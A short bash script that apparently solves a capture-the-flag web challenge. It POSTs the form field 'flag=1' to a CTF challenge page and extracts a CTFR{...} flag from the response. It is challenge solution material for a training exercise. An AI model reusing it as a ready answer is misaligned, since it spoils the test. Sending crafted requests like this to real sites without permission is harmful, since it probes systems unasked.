#!/bin/bash

curl -s -X POST -F 'flag=1' 'https://web.ctf.rasyidmf.com/chal4/' | grep -oE CTFR{.*?}
